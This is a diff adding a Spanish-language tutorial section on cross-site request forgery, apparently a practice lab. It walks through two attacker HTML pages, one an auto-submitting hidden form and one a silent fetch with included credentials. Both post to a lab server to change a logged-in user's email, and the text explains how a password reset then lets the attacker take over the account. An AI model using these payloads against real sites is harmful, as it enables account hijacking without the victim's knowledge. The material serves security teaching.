@@ -161,3 +161,98 @@ En la actualidad existen varios ataques cibernéticos hacia aplicaciones web que
       el servidor retorna una cookie de sesion para cada uno de los usuarios en el cual servira para realizar las peticiones al servidor.
 
       en el caso de las cookies es bueno recodar que se guardan en el dominio no por pagina, es decir, una misma cookie estara activa en todas las paginas del dominio sin importar en donde este.
+
+      
+      ![007](img/007.png)  
+      **nota:** en el cual existe una url vulnerable que es la de editar el corrreo electronico.
+
+      con esa vamos a trabajar esta practica.
+
+      en cual vamos a realizar el primer ejemplo del ataque
+
+      con el siguiente codigo:
+
+      ```html
+      <!DOCTYPE html>
+      <html lang="en">
+
+      <head>
+          <meta charset="UTF-8">
+          <meta http-equiv="X-UA-Compatible" content="IE=edge">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Atacante</title>
+      </head>
+
+      <body>
+          <form name="form" action="http://165.227.167.80:3001/edit" method="post">
+              <input type="hidden" name="email" value="prueba@gmail.com">
+          </form>
+      </body>
+      <script>
+          document.form.submit();
+      </script>
+
+      </html>
+      ```
+      este codigo realiza la accion que cuando el usuario ingrese a esa url como ya esta iniciado sesion en la aplicacion realiza la peticion al servidor **http://165.227.167.80:3001/edit** para cambiar el correo por **prueba@gmail.com** en ese caso un es correo pero puede hacer que una compra de un articulo, una transaccion de una cuenta hacia otra.
+
+      ![008](img/008.png)  
+
+      ![008](img/009.png)  
+
+      **nota:** como se puede observar en request se establece el cambio del correo electronico, pero se realizo con la pagina de atacante por descuido del usuario pero ahi todavia se dio cuenta que se cambio el correo electronico
+
+      para ello vamos a realizar el siguente ejemplo para que observern que puede realizar sin que se cuenta de la accion.
+
+      con el siguente codigo:
+
+      ```html
+      <!DOCTYPE html>
+      <html lang="en">
+
+      <head>
+          <meta charset="UTF-8">
+          <meta http-equiv="X-UA-Compatible" content="IE=edge">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Atacante</title>
+      </head>
+
+      <body>
+
+      </body>
+      <script>
+          fetch('http://165.227.167.80:3001/edit', {
+              method: 'POST',
+              credentials: 'include',
+              mode: 'no-cors',
+              headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded',
+              },
+              body: 'email=hacker@hack.com',
+          })
+              .then(res => console.log(res.status))
+              .catch(err => console.log(err));
+      </script>
+
+      </html>
+      ```
+
+      en este caso se hara con **fecth api** a la misma url y cambiar dicho email, este caso no se dara cuenta de la accion porque permancera en la misma pagina
+
+      ![010](img/010.png)  
+
+      ![011](img/011.png)  
+
+      **nota:** en este como pueden observar no cambio de url a la que direcciona cuando se hace normalente para que el usuario no se de cuenta de dicha accion.
+
+      en el caso que el usuario desee cerrar sesion
+
+      ![012](img/012.png)  
+
+      y vuelva a intentar ingresar sus crendenciales
+
+      ![001t](img/004.png)  
+
+      ![013](img/013.png)  
+
+      lo que sucedera es que mostrara el mensaje que indica que sus credenciales no son validas y por conscuente el usuario pedira un cambio de contraseña, y ese link sera enviado al correo del atacante y atacante podra cambiar la contraseña
